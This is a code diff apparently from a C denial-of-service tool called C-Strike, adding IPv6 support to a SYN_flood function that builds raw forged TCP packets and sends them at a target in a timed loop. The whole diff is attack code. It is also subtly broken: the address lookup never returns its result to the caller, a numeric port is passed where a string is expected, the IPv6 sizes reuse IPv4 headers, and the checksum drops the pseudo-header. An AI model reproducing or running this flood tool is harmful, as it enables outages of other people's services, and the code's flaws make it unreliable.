@@ -12,6 +12,7 @@
 #include <netinet/tcp.h>
 #include <netinet/udp.h>
 #include <netinet/ip.h>
+#include <netinet/ip6.h>
 #include <netdb.h>
 #include "C-Strike.h"
 
@@ -91,8 +92,29 @@ void generate_random_string(char *str, size_t length) {
     str[length] = '\0';
 }
 
+void get_target_addr(char* target, struct addrinfo *res, struct addrinfo *hints){
+    struct addrinfo *p;
+    int status = getaddrinfo(target,port,hints,&res);
+    if (status != 0) {
+        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
+        return;
+    }
+    for (p = res; p != NULL; p = p->ai_next) {
+        int sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
+        if (sock == -1) continue;
+        close(sock);
+        break;
+    }
+}
+
 int SYN_flood(char* target,char* src, unsigned short port,unsigned int msg_len, time_t duration){
-	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    struct addrinfo hints, *res;
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_RAW;
+    hints.ai_protocol = IPPROTO_TCP;
+    get_target_addr(target,res,&hints);
+    int sock = socket(res->ai_family, SOCK_RAW, IPPROTO_TCP);
     if (sock < 0) {
         perror("Socket error");
         return 1;
@@ -105,14 +127,13 @@ int SYN_flood(char* target,char* src, unsigned short port,unsigned int msg_len, 
     memset(datagram, 0, 4096);
 
     struct iphdr *iph = (struct iphdr *) datagram;
+    struct ip6_hdr *ip6h;
     struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
-    struct sockaddr_in dest;
+    size_t size;
 
-    dest.sin_family = AF_INET;
-    dest.sin_port = htons(port);
-    dest.sin_addr.s_addr = inet_addr(target);
-
+    if(res->ai_family == AF_INET){
     // Fill in IP Header
+    struct sockaddr_in *dest = (struct sockaddr_in *) res;
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
@@ -123,10 +144,16 @@ int SYN_flood(char* target,char* src, unsigned short port,unsigned int msg_len, 
     iph->protocol = IPPROTO_TCP;
     iph->check = 0;
     iph->saddr = inet_addr("192.168.1.2");
-    iph->daddr = dest.sin_addr.s_addr;
-
+    iph->daddr = dest->sin_addr.s_addr;
+    size = sizeof(struct iphdr) + sizeof(struct tcphdr);
     iph->check = checksum((unsigned short *) datagram, iph->tot_len);
-
+    }else if(res->ai_family == AF_INET6){
+        struct sockaddr_in6 *dest = (struct sockaddr_in6 *) res;
+        ip6h = (struct ip6_hdr *) datagram;
+        inet_pton(AF_INET6, src, &ip6h->ip6_src);
+        ip6h->ip6_dst = dest->sin6_addr;
+        size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    }
     // Fill in TCP Header
     tcph->source = htons(random_ushort());
     tcph->dest = htons(80);
@@ -137,23 +164,10 @@ int SYN_flood(char* target,char* src, unsigned short port,unsigned int msg_len, 
     tcph->window = htons(5840);
     tcph->check = 0;
     tcph->urg_ptr = 0;
-
-    // Pseudo header for checksum
-    struct pseudo_header psh;
-    psh.source_address = inet_addr("192.168.1.2");
-    psh.dest_address = dest.sin_addr.s_addr;
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr));
-
-    char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
-    memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
-    memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-
-    tcph->check = checksum((unsigned short *)pseudo_packet, sizeof(pseudo_packet));
+    tcph->check = checksum((unsigned short *)datagram, size);
     while(time(NULL)<end){
         if (sendto(sock, datagram, iph->tot_len, 0,
-               (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+               res->ai_addr, res->ai_addrlen) < 0) {
 	perror("Send failed");
 	return 2;
         } else {
